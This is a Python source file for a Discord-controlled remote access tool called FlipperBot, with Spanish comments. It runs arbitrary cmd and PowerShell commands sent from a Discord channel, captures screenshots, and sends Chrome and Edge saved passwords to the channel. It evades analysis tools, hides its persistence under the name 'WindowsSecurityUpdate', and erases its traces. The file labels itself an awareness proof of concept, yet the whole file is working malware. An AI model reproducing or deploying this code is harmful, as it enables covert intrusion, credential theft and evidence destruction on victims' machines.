import discord
from discord.ext import commands, tasks
import subprocess
import platform
import psutil
import os
import sys
import io
import datetime
import json
import shutil

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

WATCHDOG_PROCESSES = [
    "taskmgr", "procmon", "procmon64", "procexp", "procexp64",
    "ProcessHacker", "Wireshark", "tcpview", "tcpview64",
    "autoruns", "autoruns64", "perfmon",
]

ALLOWED_CHANNEL = None
BOT_TOKEN = None

script_dir = os.path.dirname(os.path.abspath(__file__))
config_path = os.path.join(script_dir, "config.py")

if os.path.exists(config_path):
    config = {}
    with open(config_path) as f:
        exec(f.read(), config)
    BOT_TOKEN = config.get("BOT_TOKEN")
    ALLOWED_CHANNEL = config.get("CHANNEL_ID")
else:
    BOT_TOKEN = os.environ.get("BOT_TOKEN")
    ch = os.environ.get("CHANNEL_ID")
    if ch:
        ALLOWED_CHANNEL = int(ch)


def channel_check(ctx):
    if ALLOWED_CHANNEL is None:
        return True
    return ctx.channel.id == ALLOWED_CHANNEL


@tasks.loop(seconds=30)
async def watchdog():
    running = [p.name().lower() for p in psutil.process_iter(["name"])]
    detected = [w for w in WATCHDOG_PROCESSES if w.lower() in running]
    if detected and ALLOWED_CHANNEL:
        channel = bot.get_channel(ALLOWED_CHANNEL)
        if channel:
            embed = discord.Embed(
                title="ALERTA: Herramienta de analisis detectada",
                description=f"Procesos: **{', '.join(detected)}**",
                color=0xED4245,
            )
            embed.add_field(name="PC", value=platform.node(), inline=True)
            embed.add_field(name="Accion", value="Autodestruccion iniciada", inline=True)
            await channel.send(embed=embed)
            cleanup_and_exit()


def cleanup_and_exit():

    ps_cmd_persistence = (
        "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
        "-Name 'WindowsSecurityUpdate' -ErrorAction SilentlyContinue"
    )
    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_cmd_persistence],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )

    ps_history = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "PowerShell", "PSReadLine",
        "ConsoleHost_history.txt",
    )
    try:
        with open(ps_history, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        clean = [l for l in lines if BOT_TOKEN not in l and "FlipperBot" not in l]
        with open(ps_history, "w", encoding="utf-8") as f:
            f.writelines(clean)
    except OSError:
        pass

    ps_cmd = (
        "$rp = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU'; "
        "$props = Get-ItemProperty -Path $rp -ErrorAction SilentlyContinue; "
        "if ($props) { foreach ($n in $props.PSObject.Properties.Name) { "
        f"if ($props.$n -is [string] -and $props.$n -like '*FlipperBot*') {{ "
        "Remove-ItemProperty -Path $rp -Name $n -ErrorAction SilentlyContinue } } }"
    )
    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_cmd],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )

    pip_cache = os.path.join(os.environ.get("LOCALAPPDATA", ""), "pip", "cache")
    try:
        shutil.rmtree(pip_cache, ignore_errors=True)
    except OSError:
        pass

    recent_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "Recent",
    )
    try:
        for f in os.listdir(recent_dir):
            if any(kw in f.lower() for kw in ["flipperbot", "bot.py", "config.py", "setup_bot"]):
                os.remove(os.path.join(recent_dir, f))
    except OSError:
        pass

    subprocess.Popen(
        ["ipconfig", "/flushdns"],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )

    try:
        shutil.rmtree(script_dir, ignore_errors=True)
    except OSError:
        pass

    os._exit(0)


def extract_credentials():
    exe_path = os.path.join(script_dir, 'creds_extractor.exe')
    if not os.path.exists(exe_path):
        return []
    try:
        result = subprocess.run(
            [exe_path], capture_output=True, text=True, timeout=30,
        )
        data = json.loads(result.stdout)
        creds = []
        for c in data.get('credentials', []):
            creds.append({
                'browser': c.get('browser', ''),
                'profile': 'Default',
                'url': c.get('url', ''),
                'username': c.get('username', ''),
                'password': c.get('password', ''),
                'version': c.get('encrypted_version', ''),
            })
        return creds
    except Exception:
        return []


@bot.event
async def on_ready():
    print(f"[+] FlipperBot conectado como {bot.user}")
    if not watchdog.is_running():
        watchdog.start()
    if ALLOWED_CHANNEL:
        channel = bot.get_channel(ALLOWED_CHANNEL)
        if channel:
            embed = discord.Embed(
                title="FlipperBot Conectado",
                description=f"Agente activo en **{platform.node()}**",
                color=0x00FF00,
            )
            embed.add_field(name="Usuario", value=os.getlogin(), inline=True)
            embed.add_field(name="OS", value=platform.system() + " " + platform.release(), inline=True)
            embed.set_footer(text="Escribe !ayuda para ver los comandos disponibles")
            await channel.send(embed=embed)


@bot.command(name="ayuda")
async def ayuda(ctx):
    """Muestra los comandos disponibles"""
    if not channel_check(ctx):
        return
    embed = discord.Embed(
        title="FlipperBot - Comandos",
        description="Lista de comandos disponibles:",
        color=0x3498DB,
    )
    embed.add_field(name="!ping", value="Verifica que el bot esta activo", inline=False)
    embed.add_field(name="!info", value="Informacion basica del sistema", inline=False)
    embed.add_field(name="!screenshot", value="Captura de pantalla", inline=False)
    embed.add_field(name="!say [texto]", value="La PC habla el texto en voz alta", inline=False)
    embed.add_field(name="!notify [titulo] | [mensaje]", value="Muestra notificacion en Windows", inline=False)
    embed.add_field(name="!cmd [comando]", value="Ejecuta un comando del sistema operativo", inline=False)
    embed.add_field(name="!ps [comando]", value="Ejecuta un comando de PowerShell", inline=False)
    embed.add_field(name="!creds", value="Extrae credenciales guardadas en Chrome/Edge", inline=False)
    embed.add_field(name="!uptime", value="Tiempo encendida de la PC", inline=False)
    embed.add_field(name="!exit", value="Apaga el bot", inline=False)
    embed.add_field(name="!selfdestruct", value="Elimina toda evidencia y apaga el bot", inline=False)
    await ctx.send(embed=embed)


@bot.command()
async def ping(ctx):
    """Verifica que el bot esta activo"""
    if not channel_check(ctx):
        return
    latency = round(bot.latency * 1000)
    await ctx.send(f"Pong! Latencia: **{latency}ms**")


@bot.command()
async def info(ctx):
    """Muestra informacion basica del sistema"""
    if not channel_check(ctx):
        return
    mem = psutil.virtual_memory()
    embed = discord.Embed(title="Informacion del Sistema", color=0x3498DB)
    embed.add_field(name="PC", value=platform.node(), inline=True)
    embed.add_field(name="Usuario", value=os.getlogin(), inline=True)
    embed.add_field(name="OS", value=platform.platform(), inline=False)
    embed.add_field(name="CPU", value=platform.processor() or "N/A", inline=False)
    embed.add_field(name="RAM Total", value=f"{mem.total // (1024**3)} GB", inline=True)
    embed.add_field(name="RAM Usada", value=f"{mem.percent}%", inline=True)
    embed.add_field(name="Uso CPU", value=f"{psutil.cpu_percent(interval=1)}%", inline=True)

    boot = datetime.datetime.fromtimestamp(psutil.boot_time())
    embed.add_field(name="Encendida desde", value=boot.strftime("%Y-%m-%d %H:%M"), inline=False)
    await ctx.send(embed=embed)


@bot.command()
async def screenshot(ctx):
    """Toma una captura de pantalla"""
    if not channel_check(ctx):
        return
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await ctx.send(
            content="Captura de pantalla:",
            file=discord.File(buf, filename="screenshot.png"),
        )
    except Exception as e:
        await ctx.send(f"Error al tomar captura: {e}")


@bot.command()
async def say(ctx, *, mensaje: str):
    """Hace que la PC hable usando el sintetizador de voz de Windows"""
    if not channel_check(ctx):
        return
    safe_msg = mensaje.replace('"', "'").replace("`", "'")
    ps_cmd = (
        'Add-Type -AssemblyName System.Speech; '
        '$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
        f'$s.Speak("{safe_msg}")'
    )
    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_cmd],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    await ctx.send(f"Hablando: *{mensaje}*")


@bot.command()
async def notify(ctx, *, contenido: str):
    """Muestra una notificacion toast en Windows. Uso: !notify titulo | mensaje"""
    if not channel_check(ctx):
        return
    if "|" in contenido:
        titulo, mensaje = contenido.split("|", 1)
        titulo = titulo.strip()
        mensaje = mensaje.strip()
    else:
        titulo = "FlipperBot"
        mensaje = contenido.strip()

    safe_title = titulo.replace("'", "''")
    safe_msg = mensaje.replace("'", "''")

    ps_cmd = (
        "Add-Type -AssemblyName System.Windows.Forms; "
        "$n = New-Object System.Windows.Forms.NotifyIcon; "
        "$n.Icon = [System.Drawing.SystemIcons]::Information; "
        "$n.Visible = $true; "
        f"$n.ShowBalloonTip(5000, '{safe_title}', '{safe_msg}', "
        "[System.Windows.Forms.ToolTipIcon]::Info); "
        "Start-Sleep -Seconds 6; "
        "$n.Dispose()"
    )
    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_cmd],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    await ctx.send(f"Notificacion enviada: **{titulo}** - {mensaje}")


@bot.command()
async def uptime(ctx):
    """Muestra el tiempo que lleva encendida la PC"""
    if not channel_check(ctx):
        return
    boot = datetime.datetime.fromtimestamp(psutil.boot_time())
    delta = datetime.datetime.now() - boot
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    await ctx.send(f"Uptime: **{hours}h {minutes}m {seconds}s**")


async def _run_and_reply(ctx, args, shell_prefix=None):
    """Ejecuta un comando y envia el resultado al canal."""
    if shell_prefix:
        full_cmd = shell_prefix + args
    else:
        full_cmd = args
    try:
        proc = subprocess.run(
            full_cmd,
            capture_output=True,
            text=True,
            timeout=60,
            shell=True,
        )
        output = ""
        if proc.stdout:
            output += proc.stdout
        if proc.stderr:
            output += proc.stderr
        if not output.strip():
            output = "(sin output)"
        exit_info = f"[exit code: {proc.returncode}]"
    except subprocess.TimeoutExpired:
        output = "ERROR: comando excedio el timeout de 60 segundos."
        exit_info = "[timeout]"
    except Exception as e:
        output = f"ERROR: {e}"
        exit_info = "[error]"

    header = f"```\n> {args}\n{exit_info}\n```\n"
    if len(header) + len(output) + 8 <= 2000:
        await ctx.send(header + f"```\n{output}\n```")
    else:
        buf = io.BytesIO(output.encode("utf-8"))
        await ctx.send(header, file=discord.File(buf, filename="output.txt"))


@bot.command()
async def cmd(ctx, *, comando: str):
    """Ejecuta un comando del sistema operativo (cmd.exe)"""
    if not channel_check(ctx):
        return
    await _run_and_reply(ctx, comando, shell_prefix="cmd /C ")


@bot.command()
async def ps(ctx, *, comando: str):
    """Ejecuta un comando de PowerShell"""
    if not channel_check(ctx):
        return
    await _run_and_reply(ctx, comando, shell_prefix="powershell -NoProfile -Command ")


@bot.command()
async def creds(ctx):
    """Extrae credenciales guardadas en Chrome y Edge (PoC de concientizacion)"""
    if not channel_check(ctx):
        return
    await ctx.send("Extrayendo credenciales guardadas...")
    try:
        credentials = extract_credentials()
    except Exception as e:
        await ctx.send(f"Error al extraer credenciales: {e}")
        return
    if not credentials:
        embed = discord.Embed(
            title="Credenciales del Navegador",
            description="No se encontraron credenciales guardadas.",
            color=0xFEE75C,
        )
        await ctx.send(embed=embed)
        return
    chrome_count = sum(1 for c in credentials if c['browser'] == 'Chrome')
    edge_count = sum(1 for c in credentials if c['browser'] == 'Edge')
    decrypted = sum(1 for c in credentials if c['password'])
    protected = sum(1 for c in credentials if not c['password'])
    desc = f"**{len(credentials)}** credenciales con usuario almacenado."
    if decrypted:
        desc += f"\n**{decrypted}** contrasenas descifradas (incluye v20 App-Bound)."
    if protected:
        desc += f"\n**{protected}** no descifradas."
    embed = discord.Embed(
        title="Credenciales Extraidas",
        description=desc,
        color=0xED4245,
    )
    if chrome_count:
        embed.add_field(name="Chrome", value=f"{chrome_count} credenciales", inline=True)
    if edge_count:
        embed.add_field(name="Edge", value=f"{edge_count} credenciales", inline=True)
    embed.set_footer(text="PoC — No guardes contrasenas en el navegador")
    await ctx.send(embed=embed)
    output = "=" * 70 + "\n"
    output += "  CREDENCIALES GUARDADAS EN EL NAVEGADOR\n"
    output += "  PoC de concientizacion: demuestra por que NO debes guardar\n"
    output += "  contrasenas en el navegador sin un gestor de contrasenas\n"
    output += "=" * 70 + "\n\n"
    for i, c in enumerate(credentials, 1):
        pwd_display = c['password'] if c['password'] else f"[cifrado {c['version']}]"
        output += f"[{i}] {c['browser']} ({c['profile']})\n"
        output += f"    URL:      {c['url']}\n"
        output += f"    Usuario:  {c['username']}\n"
        output += f"    Password: {pwd_display}\n"
        output += "-" * 50 + "\n"
    output += f"\nTotal: {len(credentials)} credenciales\n"
    output += f"Descifradas: {decrypted} | No descifradas: {protected}\n"
    output += "\nNOTA: Se uso inyeccion de DLL en el proceso del navegador\n"
    output += "para evadir App-Bound Encryption (Chrome 127+/v20).\n"
    output += "Esto demuestra por que NO debes guardar contrasenas\n"
    output += "en el navegador sin un gestor de contrasenas.\n"
    buf = io.BytesIO(output.encode('utf-8'))
    await ctx.send(
        file=discord.File(buf, filename=f"credenciales_{platform.node()}.txt"),
    )


@bot.command(name="exit")
async def exit_bot(ctx):
    """Apaga el bot"""
    if not channel_check(ctx):
        return
    await ctx.send("FlipperBot desconectandose... Adios!")
    await bot.close()


@bot.command(name="selfdestruct")
async def selfdestruct(ctx):
    """Elimina toda evidencia y apaga el bot"""
    if not channel_check(ctx):
        return
    embed = discord.Embed(
        title="Autodestruccion manual iniciada",
        description="Eliminando toda evidencia...",
        color=0xED4245,
    )
    embed.add_field(name="PC", value=platform.node(), inline=True)
    await ctx.send(embed=embed)
    cleanup_and_exit()


if not BOT_TOKEN:
    print("[!] ERROR: No se encontro el token del bot.")
    print("[!] Crea un archivo config.py con:")
    print('    BOT_TOKEN = "tu_token_aqui"')
    print("    CHANNEL_ID = 123456789012345678")
    print("[!] O ejecuta setup_bot.ps1 que lo crea automaticamente.")
    sys.exit(1)

bot.run(BOT_TOKEN)
